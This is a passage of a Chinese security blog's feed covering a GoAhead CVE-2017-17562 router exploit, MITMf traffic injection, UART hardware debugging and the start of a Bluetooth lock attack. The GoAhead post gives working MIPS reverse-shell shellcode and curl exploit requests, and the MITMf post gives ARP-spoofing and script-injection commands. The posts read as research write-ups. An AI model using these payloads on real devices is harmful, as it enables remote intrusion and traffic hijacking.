image选项可以选择保存的路径和文件名，然后点Perform actions，即可开始读取。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135409.jpg" alt="QQ截图20180116135409"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/20180116135434.jpg" alt="QQ截图20180116135434"></p><p>读取的文件格式为HEX，然后根据对应的CPU指令编写进行反汇编。   </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/78B82770-AB46-4404-B195-2B28835DF2AC.jpg" alt="QQ截图20180116135452"></p><p>部分芯片另需进行开片和晶体电路修改等等深度处理，本文是伏宸实验室关于芯片安全的一篇先导性文章，后续将会有一系列关于芯片安全的文章，敬请期待。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h2 id=&quot;前言-1&quot;&gt;&lt;a href=&quot;#前言-1&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p
      
    
    </summary>
    
      <category term="芯片安全" scheme="http://yaseng.org/categories/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="芯片安全" scheme="http://yaseng.org/tags/%E8%8A%AF%E7%89%87%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2018-06-29T10:28:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816099569.jpg" alt=""></p><p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816744632.jpg" alt=""></p><p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137935699186.jpg" alt=""></p><p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/IMG_2461.jpg" alt="IMG_2461"></p><p>查看web server 是否 goahead 并且有cgi程序。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/debug.jpg" alt="debug"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137864957443.jpg" alt=""></p><p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pentest@ubuntu:~/buildroot$ cat   mipsel-hw.c</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    write(1, &quot;Hello: World!\n&quot;, 14);</span><br><span class="line">&#125;</span><br><span class="line">pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</span><br><span class="line">pentest@ubuntu:~/buildroot$ file mipsel-hw.so</span><br><span class="line">mipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-hw.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137866081821.jpg" alt=""></p><p>回显成功，说明漏洞存在。</p><h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137880896364.jpg" alt=""></p><p>写入动态链接库中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char sc[] = &#123;</span><br><span class="line">    &quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04&quot;</span><br><span class="line">    &quot;\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20&quot;</span><br><span class="line">    &quot;\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27&quot;</span><br><span class="line">    &quot;\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24&quot;</span><br><span class="line">    &quot;\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00&quot;</span><br><span class="line">    &quot;\xa5\x34\xf8\xff\xa5\xaf\x10\x67\x05\x3c\xc0\xa8\xa5\x34\xfc&quot;</span><br><span class="line">    &quot;\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01&quot;</span><br><span class="line">    &quot;\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08&quot;</span><br><span class="line">    &quot;\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff&quot;</span><br><span class="line">    &quot;\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec&quot;</span><br><span class="line">    &quot;\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23&quot;</span><br><span class="line">    &quot;\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09&quot;</span><br><span class="line">    &quot;\x01&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void(*s)(void);</span><br><span class="line">    s = sc;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Buildroot编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  &quot;user=admin;platform=0&quot;  --data-binary @payloads/mipsel-reverse-tcp.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0</span><br></pre></td></tr></table></figure><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137897078140.jpg" alt=""></p><p>成功反弹shell<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137898902411.jpg" alt=""></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li><li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead</a></li><li>routesplite  <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">https://github.com/reverse-shell/routersploit</a></li><li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" target="_blank" rel="noopener">http://future-sec.com/iot-security-hardware-debuging.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://yaseng.org/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://yaseng.org/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://yaseng.org/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T10:33:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1  --inject --html-payload &apos;&lt;script&gt;alert(0)&lt;/script&gt;&apos;</span><br></pre></td></tr></table></figure><p>victim 访问<br><a href="http://yaseng.org/project">http://yaseng.org/project</a></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg" alt=""></p><p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" target="_blank" rel="noopener">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg" alt=""></p><p>attack 端</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg" alt="img"></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def HTTP(self, http_redir_port):</span><br><span class="line">    log.debug(&quot;Setting iptables HTTP redirection rule from port 80 to &#123;&#125;&quot;.format(http_redir_port))</span><br><span class="line">    os.system(&apos;iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;&apos;.format(http_redir_port))</span><br></pre></td></tr></table></figure><p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</span><br></pre></td></tr></table></figure><p>attack</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg" alt="mg"><br>victim<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg" alt=""></p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://yaseng.org/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="中间人攻击" scheme="http://yaseng.org/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="渗透测试" scheme="http://yaseng.org/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="MITMf" scheme="http://yaseng.org/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://yaseng.org/iot-security-hardware-debuging.html"/>
    <id>http://yaseng.org/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-29T10:55:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。<br>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。<br>对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别,  以及RS232, TTL等关系,             实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).<br>UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。<br> 在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image32.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image33.jpg" alt=""></p><h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image65.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image66.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image67.jpg" alt=""></p><p>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image68.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image69.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image70.jpg" alt=""></p><p>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image101.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image102.jpg" alt=""></p><p>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image71.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image72.jpg" alt=""></p><h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image73.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image35.jpg" alt=""></p><p>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image74.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image75.jpg" alt=""></p><h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image76.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image77.jpg" alt=""></p><p>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image78.jpg" alt=""></p><h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image79.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image80.jpg" alt=""></p><p>设置波特率为57600，串口输出正确，并可执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image81.jpg" alt=""></p><h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image82.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image83.jpg" alt=""></p><p>设置波特率为57600，串口输出正确，并可执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image84.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image85.jpg" alt=""></p><p>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image86.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image87.jpg" alt=""></p><h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image88.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image89.jpg" alt=""><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image90.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image91.jpg" alt=""></p><h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image122.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image123.jpg" alt=""></p><p>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image124.jpg" alt=""></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image125.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://yaseng.org/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>如何破解一个蓝牙锁</title>
    <link href="http://yaseng.org/how-to-crack-a-ble-lock.html"/>
    <id>http://yaseng.org/how-to-crack-a-ble-lock.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:29:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。</p><h2 id="蓝牙锁介绍"><a href="#蓝牙锁介绍" class="headerlink" title="蓝牙锁介绍"></a>蓝牙锁介绍</h2><p> 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage9.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage10.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage11.jpg" alt="img"></p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage12.jpg" alt="img"></p><h2 id="如何去破解一个蓝牙锁"><a href="#如何去破解一个蓝牙锁" class="headerlink" title="如何去破解一个蓝牙锁"></a>如何去破解一个蓝牙锁</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage13.jpg" alt="img"></p><h3 id="目标介绍"><a href="#目标介绍" class="headerlink" title="目标介绍"></a>目标介绍</h3><p>这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。</p><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/bimage14.jpg" alt="img"></p><h3 id="内部构架"><a href="#内部构架" class="headerlink" title="内部构架"></a>内部构架</h3><p>显微镜查看电路板<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2214.jpg" alt="img"></p><p>拆解<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/IMG_2216.jpg" alt="img"></p><p>蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。</p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>使用app初步连接探测，可以看到</p><p><img 